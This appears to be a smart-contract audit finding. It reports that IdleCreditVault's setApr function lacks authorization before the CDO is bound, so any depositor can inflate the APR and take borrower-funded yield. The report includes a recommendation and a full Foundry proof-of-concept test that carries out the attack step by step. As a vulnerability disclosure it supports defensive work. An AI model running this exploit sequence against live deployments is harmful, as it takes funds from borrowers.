### Title
Unauthenticated APR overwrite before `idleCDO` binding lets a depositor force borrower-funded yield - (File: `contracts/strategies/idle/IdleCreditVault.sol`)

### Summary
`IdleCreditVault.setApr` skips authorization entirely while `idleCDO == address(0)`, allowing any EOA to raise `lastApr` to `DEFAULT_MAX_APR` during the setup gap before `setWhitelistedCDO` binds the strategy. [1](#0-0) [2](#0-1) 

### Finding Description
`setApr` is public and checks `msg.sender` only when `idleCDO` has already been configured, so an attacker can call it after strategy initialization but before the owner whitelists the CDO. [1](#0-0)  The attacker can set `lastApr` to the default maximum `20e18`, while the subsequent `setWhitelistedCDO` call does not reset or validate the APR. [3](#0-2) [1](#0-0)  `getApr` returns this poisoned `lastApr`, and `startEpoch` uses it through `_calcInterest(getContractValue())` to set `expectedEpochInterest`. [4](#0-3) [5](#0-4)  At epoch end, the honest borrower is asked to transfer that inflated interest plus any pending withdrawal obligations to the CDO. [6](#0-5) [7](#0-6) 

### Impact Explanation
A KYC-passed attacker who is the sole AA depositor captures the unauthorized interest when the inflated NAV is split into tranche prices and later redeemed. [8](#0-7) [9](#0-8)  With a 30-day epoch, intended APR of zero, and no performance fee, setting `lastApr` to `20e18` makes the borrower overpay approximately `principal * 0.20 * 30 / 365`, or about `1.64384%` of principal. [10](#0-9)  This is direct theft of borrower-funded yield rather than a rounding or availability issue. [11](#0-10) 

### Likelihood Explanation
The exploit requires a deployment or migration window in which the strategy has been initialized but `setWhitelistedCDO` has not yet run; the code explicitly permits calls during that setup state. [12](#0-11) [2](#0-1)  The attacker must pass the configured wallet check to deposit, but does not need owner, manager, borrower, CDO, or contract-level privileges to poison the APR first. [13](#0-12) 

### Recommendation
Require `msg.sender == owner()` or `msg.sender == manager` whenever `idleCDO == address(0)`, or make `initialize` atomically bind a nonzero `idleCDO` so the unauthenticated setup path cannot be reached. [1](#0-0) [2](#0-1) 

### Proof of Concept
Add this regression test to `test/foundry/IdleCreditVault.t.sol` alongside the existing credit-vault fork fixtures. [14](#0-13) 

```solidity
function testUnboundStrategyAprCanBePoisonedBeforeWhitelisting() external {
    address attacker = makeAddr("aprPoisonAttacker");
    address proxyAdmin = makeAddr("proxyAdmin");
    uint256 depositAmount = 10_000 * ONE_SCALE;

    // Fresh production strategy, initialized but intentionally not yet linked to a CDO.
    IdleCreditVault poisonedStrategy = IdleCreditVault(
        address(
            new TransparentUpgradeableProxy(
                address(new IdleCreditVault()),
                proxyAdmin,
                ""
            )
        )
    );
    poisonedStrategy.initialize(
        defaultUnderlying,
        owner,
        manager,
        borrower,
        "Poisoned Borrower",
        0 // intended APR: zero
    );

    IdleCDOEpochVariant poisonedCdo = IdleCDOEpochVariant(
        address(
            new TransparentUpgradeableProxy(
                address(new IdleCDOEpochVariant()),
                proxyAdmin,
                ""
            )
        )
    );
    poisonedCdo.initialize(
        0,
        defaultUnderlying,
        owner,
        owner,
        address(0),
        address(poisonedStrategy),
        FULL_ALLOC
    );

    // Attack window: strategy initialized, CDO already configured to use it,
    // but strategy.idleCDO is still zero.
    assertEq(poisonedStrategy.idleCDO(), address(0));
    assertEq(poisonedStrategy.getApr(), 0);

    vm.prank(attacker);
    poisonedStrategy.setApr(poisonedStrategy.DEFAULT_MAX_APR());
    assertEq(poisonedStrategy.getApr(), 20e18);

    // Honest owner completes the binding without resetting the poisoned APR.
    vm.prank(owner);
    poisonedStrategy.setWhitelistedCDO(address(poisonedCdo));

    // The attacker becomes the sole KYC-passed AA depositor.
    deal(defaultUnderlying, attacker, depositAmount);
    vm.startPrank(attacker);
    IERC20Detailed(defaultUnderlying).approve(address(poisonedCdo), depositAmount);
    poisonedCdo.depositAA(depositAmount);
    vm.stopPrank();

    vm.prank(manager);
    poisonedCdo.startEpoch();

    uint256 expectedGain =
        depositAmount * (20e18 / 100) * poisonedCdo.epochDuration() /
        (365 days * ONE_TRANCHE);

    // Honest borrower funds the requested principal plus poisoned interest.
    deal(defaultUnderlying, borrower, depositAmount + expectedGain + ONE_SCALE);
    vm.prank(borrower);
    IERC20Detailed(defaultUnderlying).approve(
        address(poisonedCdo),
        depositAmount + expectedGain + ONE_SCALE
    );

    vm.warp(poisonedCdo.epochEndDate() + 1);
    vm.prank(manager);
    poisonedCdo.stopEpoch(0, 1); // close the pool and recall principal + interest

    uint256 attackerBefore = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.startPrank(attacker);
    poisonedCdo.requestWithdraw(0, poisonedCdo.AATranche());
    poisonedCdo.claimWithdrawRequest();
    vm.stopPrank();

    uint256 payout =
        IERC20Detailed(defaultUnderlying).balanceOf(attacker) - attackerBefore;

    assertGt(payout, depositAmount);
    // MIN_LIQUIDITY leaves approximately 1_000 wei of tranche value unclaimed.
    assertApproxEqAbs(payout, depositAmount + expectedGain, 2_000);
}
```

### Citations

**File:** contracts/strategies/idle/IdleCreditVault.sol (L143-147)
```text
    maxApr = DEFAULT_MAX_APR;
    // on the first setup we set the lastApr equal to the unscaledApr
    lastApr = _apr;
    unscaledApr = _apr;
    defaultRecoveryInitialized = true;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L178-180)
```text
  /// @notice current fixed apr for the epoch
  function getApr() external view returns (uint256) {
    return lastApr;
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L225-235)
```text
  function setApr(uint256 _apr) public {
    address _cdo = idleCDO;

    // if cdo is not yet set we skip the check (this can happen only during the setup)
    if (_cdo != address(0)) {
      if (msg.sender != _cdo && msg.sender != manager) revert NotAllowed();
    }
    uint256 _maxApr = maxApr;
    if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
    lastApr = _apr;
  }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L953-956)
```text
  /// @notice allow to update whitelisted address
  function setWhitelistedCDO(address _cdo) external onlyOwner {
    require(_cdo != address(0), "IS_0");
    idleCDO = _cdo;
```

**File:** contracts/IdleCDOEpochVariant.sol (L260-262)
```text
    int256 adjustedActiveInterest = int256(_calcInterest(getContractValue())) + interestForOverUnderPerformance;
    if (adjustedActiveInterest < 0) adjustedActiveInterest = 0;
    expectedEpochInterest = pendingWithdrawFees + uint256(adjustedActiveInterest);
```

**File:** contracts/IdleCDOEpochVariant.sol (L373-379)
```text
    uint256 _grossInterest = _isRequestingAllFunds ? _expectedInterest - _totBorrowed : _expectedInterest;
    bool _mintInterest = isInterestMinted && !_isRequestingAllFunds;
    // In minted mode IdleCDO only needs cash for withdraw requests, not for epoch interest itself.
    uint256 _amountToPullFromBorrower = _mintInterest ? 0 : _expectedInterest;
    if (_mintInterest && _interest > 1) {
      uint256 _maxApr = _strategy.maxApr();
      _checkNotAllowed(_maxApr != 0 && _grossInterest > _calcInterestWithApr(getContractValue(), _maxApr) + _pendingWithdrawFees);
```

**File:** contracts/IdleCDOEpochVariant.sol (L408-415)
```text
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L643-649)
```text
  /// @notice Deposit funds in the vault. Overrides the parent method and adds a check for wallet 
  function _deposit(uint256 _amount, address _tranche) internal override whenNotPaused returns (uint256) {
    _checkNotAllowed(!isWalletAllowed(msg.sender));
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();
    // do the inherited deposit flow
    return super._deposit(_amount, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L739-756)
```text
  function requestWithdraw(uint256 _amount, address _tranche) external returns (uint256 _underlyings) {
    _checkTranche(_tranche);
    _checkNotAllowed(
      (_tranche == AATranche ? !allowAAWithdrawRequest : !allowBBWithdrawRequest) ||
      !isWalletAllowed(msg.sender)
    );
  
    // we check if there are donated assets to the pool and transfer them to the feeReceiver if any
    _skimDonatedAssets();

    // we trigger an update accounting to check for eventual losses
    _updateAccounting();

    IdleCreditVault creditVault = IdleCreditVault(strategy);
    if (_amount == 0) {
      _amount = _userTrancheBal(msg.sender, _tranche);
    }
    _underlyings = _trancheToUnderlyings(_amount, _tranche);
```

**File:** contracts/IdleCDOEpochVariant.sol (L800-808)
```text
  function _calcInterest(uint256 _amount) internal view returns (uint256) {
    return _calcInterestWithApr(_amount, _getStrategyApr());
  }

  /// @notice Calculate the interest of an epoch for the given amount and apr
  /// @param _amount Amount of underlyings
  /// @param _apr Apr used for the calculation
  function _calcInterestWithApr(uint256 _amount, uint256 _apr) internal view returns (uint256) {
    return _amount * (_apr / 100) * epochDuration / (365 days * ONE_TRANCHE_TOKEN);
```

**File:** contracts/IdleCDOCreditVault.sol (L222-236)
```text
  function _updateAccounting() internal virtual returns (bool shutdown) {
    _accrueManagementFee();
    uint256 _lastNAVAA = lastNAVAA;
    uint256 _lastNAVBB = lastNAVBB;
    uint256 _lastNAV = _lastNAVAA + _lastNAVBB;
    uint256 nav = getContractValue();
    uint256 _aprSplitRatio = trancheAPRSplitRatio;
    // If gain is > 0, then collect some fees in `unclaimedFees`
    if (nav > _lastNAV) {
      unclaimedFees += (nav - _lastNAV) * fee / FULL_ALLOC;
    }
    (uint256 _priceAA, int256 _totalAAGain) = _virtualPriceAux(AATranche, nav, _lastNAV, _lastNAVAA, _aprSplitRatio);
    (uint256 _priceBB, int256 _totalBBGain) = _virtualPriceAux(BBTranche, nav, _lastNAV, _lastNAVBB, _aprSplitRatio);
    lastNAVAA = uint256(int256(_lastNAVAA) + _totalAAGain);
    lastNAVBB = uint256(int256(_lastNAVBB) + _totalBBGain);
```

**File:** test/foundry/IdleCreditVault.t.sol (L361-368)
```text
    proxiedStrategy.requestWithdraw(0, address(this), 0);

    stdstore.target(address(proxiedStrategy)).sig(proxiedStrategy.pendingInstantWithdraws.selector).checked_write(uint256(0));
    vm.prank(address(cdoEpoch));
    proxiedStrategy.requestWithdraw(0, address(this), 0);
    assertTrue(proxiedStrategy.defaultRecoveryInitialized(), 'first clean request should initialize recovery');
    assertFalse(proxiedStrategy.canTransfer(), 'lazy initialization should clear the legacy transfer flag');
  }
```
